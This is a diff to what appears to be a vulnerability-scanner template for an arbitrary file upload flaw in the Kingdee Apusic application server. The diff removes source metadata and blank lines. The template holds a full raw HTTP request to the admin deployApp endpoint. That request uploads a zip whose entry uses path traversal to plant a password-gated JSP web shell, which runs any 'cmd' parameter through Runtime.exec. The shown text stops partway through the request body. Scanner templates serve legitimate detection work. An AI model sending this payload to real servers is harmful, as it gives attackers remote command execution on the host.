@@ -3,12 +3,8 @@ info:
   name: 金蝶 Apusic 应用服务器任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ndcl4a7xkwgdnvah'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ndcl4a7xkwgdnvah
-    fofa: app="Apusic应用服务器"
 http:
 - raw:
   - 'POST /admin//protect/application/deployApp HTTP/1.1
@@ -20,14 +16,10 @@ http:
     Accept-Encoding: gzip
 
 
-
-
     ------WebKitFormBoundaryd9acIBdVuqKWDJbd
 
 
     Content-Disposition: form-data; name="appName"
-
-
 
 
     111
@@ -37,8 +29,6 @@ http:
 
 
     Content-Disposition: form-data; name="deployInServer"
-
-
 
 
     false
@@ -53,8 +43,6 @@ http:
     Content-Type: application/x-zip-compressed
 
 
-
-
     {{unquote("PK\x03\x04\x14\x00\x00\x00\x00\x00\xe5y\x09Uk\x0a\xc8\xe7d\x01\x00\x00d\x01\x00\x007\x00\x00\x00../../../../applications/default/public_html/dudesuite.jsp<%\x0d\x0a    if \x28\"admin\".equals\x28request.getParameter\x28\"pwd\"\x29\x29\x29 \x7b\x0d\x0a        java.io.InputStream input = Runtime.getRuntime\x28\x29.exec\x28request.getParameter\x28\"cmd\"\x29\x29.getInputStream\x28\x29;\x0d\x0a        int len = -1;\x0d\x0a        byte[] bytes = new byte[4092];\x0d\x0a        while \x28\x28len = input.read\x28bytes\x29\x29 != -1\x29 \x7b\x0d\x0a            out.println\x28new String\x28bytes, \"GBK\"\x29\x29;\x0d\x0a        \x7d\x0d\x0a    \x7d\x0d\x0a%>PK\x01\x02\x14\x03\x14\x00\x00\x00\x00\x00\xe5y\x09Uk\x0a\xc8\xe7d\x01\x00\x00d\x01\x00\x007\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb4\x81\x00\x00\x00\x00../../../../applications/default/public_html/dudesuite.jspPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00e\x00\x00\x00\xb9\x01\x00\x00\x00\x00")}}
 
 
@@ -64,26 +52,16 @@ http:
     Content-Disposition: form-data; name="archivePath"
 
 
-
-
-
-
     ------WebKitFormBoundaryd9acIBdVuqKWDJbd
 
 
     Content-Disposition: form-data; name="baseContext"
 
 
-
-
-
-
     ------WebKitFormBoundaryd9acIBdVuqKWDJbd
 
 
     Content-Disposition: form-data; name="startType"
-
-
 
 
     auto
@@ -95,18 +73,10 @@ http:
     Content-Disposition: form-data; name="loadon"
 
 
-
-
-
-
     ------WebKitFormBoundaryd9acIBdVuqKWDJbd
 
 
     Content-Disposition: form-data; name="virtualHost"
-
-
-
-
 
 
     ------WebKitFormBo'
